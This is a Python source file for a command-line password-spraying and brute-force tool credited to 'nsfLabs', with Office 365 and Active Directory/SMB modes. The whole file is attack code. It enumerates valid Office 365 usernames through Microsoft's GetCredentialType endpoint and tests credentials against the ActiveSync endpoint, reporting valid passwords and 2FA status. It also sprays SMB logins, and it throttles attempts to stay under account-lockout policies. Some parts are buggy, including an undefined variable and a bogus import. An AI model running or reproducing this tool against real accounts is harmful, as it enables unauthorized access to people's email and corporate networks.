#!/usr/bin/env python3
import io, re, os, sys, platform, requests
import time, socket, subprocess, concurrent.futures
from datetime import datetime
from argparse import ArgumentParser
from threading import Thread
from colorama import init, Fore
from time import sleep
from queue import Queue
from ArgumentParser import print_help
from nmb.NetBIOS import NetBIOS
from smb.SMBConnection import SMBConnection

init()

verbose = False

def switch():
    parser = ArgumentParser()
    parser.add_argument(
        '-m', '--mode', help='bruteforce mode to use [o365|smb]', required=True,)
    parser.add_argument(
        '-u', '--username', help='username to test [cannot be used with -uf or --userfile]', required=False)
    parser.add_argument(
        '-p', '--password', help='password to test [cannot be used with -pf or --passfile]', required=False)
    parser.add_argument(
        '-uf', '--userfile', help='list of usernames to test [cannot be used with -u or --username]', required=False)
    parser.add_argument(
        '-pf', '--passfile', help='list of password to test [cannot be used with -p or --password]', required=False)
    parser.add_argument(
        '-policy', '--policy', help='password policy to be applied [attempts,wait in seconds]', required=True)
    parser.add_argument(
        '-v', '--verbose', help='read output to terminal', required=False, action='store_true')
    parser.add_argument(
        '-h', '--host', help='hostname/IP of the target machine', required=False)
    parser.add_argument(
        '-s', '--servername', help='the computername or servername of the target machine', required=False)
    
    return parser.parse_args()


def cls():
    os_env = platform.platform()
    if 'Windows' in os_env:
        os.system('cls')
    else:
        os.system('clear')


def banner():
    banner = """
                                     .*..,
                                   ,#*/#(%#.
                                  ,%#%%#%%#
                                .*###@&#/
                ...  ..,,,,,,,*/,**#&&(*,. .,.
            .  ,/**/*/*(*/(#(,,**%%&#&#*****,.  ,
           .  (&%#####%%(&(,,*/#%%#&%#,**/*//(*  *
           #*.  ,%@&@@@@#/(/(%%&#%&#&(/((#/.   **,
           #(***,.,.                    ,*/#(///*
           *#//***,,,.,.,,,***//((((((%%%%###//*/
            #**/,.,,,,.......,***(####((#((#(/**
             #(/*,,,.,.,,,.,,,,**/((##(##(#((**,
              #(**.*,,,,,,*,,,/((((//(##(#(/**,
               ((*,,..,....,,,*//((##%%####/*.
                .(//,**,..**//((##((#%&%#(/*
                   #/#(*(##(((//#%@@%%##(/
                    &%%%#%%%%&@@&@@&&%((*
                  .(/*,,,..,,**/**((((##/,
                  %/,,,..,.,...,*(#%#%(#(/.
                    (#(/***/*//(((#####%*
                          ,/(((//,
                          
                        ...from nsfLabs
"""
    print(banner)

# Bruteforcing for userdetails
def brute_office(username, password):
    try:
        print(Fore.YELLOW +
              "Checking credentials {0}:{1}".format(username, password))
        check_user = check_o365(username)
        if(check_user == None):
            print(
                Fore.RED+"[+] Error! Target does not seem to be using Office365")
        elif (check_user == True):
            # TODO: run bruter
            header = {"MS-ASProtocolVersion": "14.0"
                      }
            LOGIN_URL = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
            STATUS_CODES = {"200": "VALID USERPASS",
                            "401": "VALID USERNAME ONLY",
                            "403": "VALID USERPASS WITH 2FA",
                            "404": "INVALID USERNAME"
                            }
            r = requests.options(LOGIN_URL, headers=header,
                                 auth=(username, password), timeout=300)

            color = Fore.GREEN+"Login Found: " if r.status_code == 200 else Fore.RED+"Invalid Login: "
            print(color+"{}:{} - {}".format(username,
                                            password, STATUS_CODES[str(r.status_code)]))

        elif(check_user == False):
            print(Fore.RED+"[+] Error! Invalid username")
        else:
            print(Fore.RED+"[+] Error! Unknown Error")
            sys.exit(0)

    except KeyboardInterrupt:
        print("[!] Detected Ctrl + C. Shutting down...")
        sys.exit(0)
    except :
        print("[!] Please check internet connection")
        sys.exit(0)


# checking if an organization uses o365 and checking if a user exist
def check_o365(username):
    if verbose:
        print(Fore.YELLOW + "[!]Checking username: {}".format(username))
    s = requests.session()
    url = 'https://login.microsoftonline.com/getuserrealm.srf?login=%s&json=1' % username
    r = s.get(url)
    res = r.text
    managed, unknown = re.search('"NameSpaceType":"Managed"', res), re.search(
        '"NameSpaceType":"Unknown"', res)
    if unknown:
        return None
    if managed:
        sleep(1)
        uri = 'https://login.microsoftonline.com/common/GetCredentialType'
        username = username.split()
        username = ' '.join(username)
        data = '{"Username": "%s"}' % username
        r = s.post(uri, data=data)
        response = r.text
        valid, invalid = re.search('"IfExistsResult":0,', response), re.search(
            '"IfExistsResult":1,', response)
        if invalid:
            return False
        if valid:
            return True


def hybrid_office_worker(policy, user, _pass):
    attempts = 1
    
    max_attempts, timelimit = tuple(policy.split(','))
    timelimit = 60*int(timelimit)
    max_attempts = int(max_attempts) - 1

    if isinstance(user, str)and isinstance(_pass, io.TextIOWrapper):
        # this shows we are spraying a single username against a passfile
        try:
            for password in _pass.readlines():
                # This is where we will apply our password policy
                if attempts == max_attempts:
                    sleep(timelimit)
                    attempts = 1
                brute_office(user, password.strip("\n"))
                attempts = attempts + 1
                sleep(timelimit//max_attempts)
        except Exception as e:
            print(e)

    elif isinstance(_pass, str) and isinstance(user, io.TextIOWrapper):
        # this shows we are spraying a single password against a userfile
        try:
            for username in user.readlines():
                # This is where we will apply our password policy
                if attempts == max_attempts:
                    sleep(timelimit)
                    attempts = 1
                brute_office(username.strip("\n"), _pass)
                attempts = attempts + 1
                sleep(timelimit//max_attempts)
        except Exception as e:
            print(e)

    elif isinstance(user, io.TextIOWrapper) and isinstance(_pass, io.TextIOWrapper):
        # this means we are spraying userfile against passfile.
        try:
            for password in _pass.readlines():
                for username in user.readlines():
                    if attempts == max_attempts:
                        sleep(timelimit)
                        attempts = 1
                    brute_office(username.strip("\n"), password.strip("\n"))
                    attempts = attempts + 1
                    sleep(timelimit//max_attempts)
        except Exception as e:
            print(e)
            exit(0)

    else:
        print(Fore.RED +"[!]Unknown input. Check the usage")

def sprayAD(host,username,password,computerName=""):
    if verbose:
        print(Fore.YELLOW +
              "Checking credentials {0}:{1}".format(username, password))
    IP, port = host.split(":")
    if not computerName:
        computerName = getServerName(IP)

    conn = SMBConnection(username,password,computerName,use_ntlm_v2 = True, is_direct_tcp=True)
    if conn.connect(IP,port):
        print(Fore.GREEN+"VALID LOGIN on {}:{} using {}:{}".format(IP,service,username,password))
    else:
        print(Fore.RED+"INVALID LOGIN on {}:{} using {}:{}".format(IP,service,username,password))
    

def hybrid_smb_worker(host, policy, user, _pass,computerName=""):
    #Run hybrid bruteforcing here
    attempts = 1
    
    max_attempts, timelimit = tuple(policy.split(','))
    timelimit = 60*int(timelimit)
    max_attempts = int(max_attempts) - 1

    if isinstance(user, str)and isinstance(_pass, io.TextIOWrapper):
        # this shows we are spraying a single username against a passfile
        try:
            for password in _pass.readlines():
                if attempts == max_attempts:
                    sleep(timelimit)
                    attempts = 1
                sprayAD(host,user, password.strip("\n"),computerName)
                attempts = attempts + 1
                sleep(timelimit//max_attempts)
        except Exception as e:
            print(e)

    elif isinstance(_pass, str) and isinstance(user, io.TextIOWrapper):
        # this shows we are spraying a single password against a userfile
        try:
            for username in user.readlines():
                if attempts == max_attempts:
                    sleep(timelimit)
                    attempts = 1
                sprayAD(host, username.strip("\n"), _pass, computerName)
                attempts = attempts + 1
                sleep(timelimit//max_attempts)
        except Exception as e:
            print(e)

    elif isinstance(user, io.TextIOWrapper) and isinstance(_pass, io.TextIOWrapper):
        # this means we are spraying userfile against passfile.
        try:
            for password in _pass.readlines():
                for username in user.readlines():
                    if attempts == max_attempts:
                        sleep(timelimit)
                        attempts = 1
                    sprayAD(host, username.strip("\n"), password.strip("\n"), computerName)
                    attempts = attempts + 1
                    sleep(timelimit//max_attempts)
        except Exception as e:
            print(e)
            exit(0)

    else:
        print(Fore.RED +"[!]Unknown input. Check the usage")

def getServerName(IP):
    try:
        server = NetBIOS()
        servername = server.queryIPForName(IP)
        return servername
    except:
        print(Fore.RED+"You need to porvide the remote computer or server name")
        exit(0)


if __name__ == '__main__':
    cls()
    banner()

    options = switch()

    mode = options.mode
    username = options.username
    password = options.password
    userfile = options.userfile
    passfile = options.passfile
    policy = options.policy
    verbose = options.verbose
    host = options.host
    servername = options.servername

    #Perform checks to make sure options are correct
    if username and userfile:
        ArgumentParser().print_help()
        sys.exit(0)
    if password and passfile:
        ArgumentParser().print_help()
        sys.exit(0)

    if username and password:
        single_test = True
    else:
        single_test = False


    # Run o365 bruteforce test
    if mode == "o365":
        print(Fore.BLUE+"Starting Office 365 Password Spraying/Bruteforce")
        if single_test:
            brute_office(username, password)
        else:
            if username and passfile:
                passfile = open(passfile, 'r')
                hybrid_office_worker(policy, username, passfile)
            elif userfile and password:
                userfile = open(userfile, 'r')
                hybrid_office_worker(policy, userfile, password)
            elif userfile and passfile:
                passfile = open(passfile, 'r')
                userfile = open(userfile, 'r')
                hybrid_office_worker(policy, userfile, passfile)
            else:
                print(Fore.RED+"[+]Unknown error! Check usage")
                ArgumentParser().print_help()
                sys.exit(0)

    # Run smb spraying test
    if mode == "smb":
        print(Fore.BLUE+"Starting AD/SMB Password Spraying/Bruteforce")
        if not servername:
            servername = ""
        if not host:
            ArgumentParser().print_help()
            sys.exit(0)
        if single_test:
            sprayAD(host, username, password, servername)
        else:
            if username and passfile:
                passfile = open(passfile, 'r')
                hybrid_smb_worker(host, policy, username, passfile, servername)
            elif userfile and password:
                userfile = open(userfile, 'r')
                hybrid_smb_worker(host, policy, userfile, password, servername)
            elif userfile and passfile:
                passfile = open(passfile, 'r')
                userfile = open(userfile, 'r')
                hybrid_smb_worker(host, policy, userfile, passfile, servername)
            else:
                print(Fore.RED+"[+]Unknown error! Check usage")
                ArgumentParser().print_help()
                sys.exit(0)
                
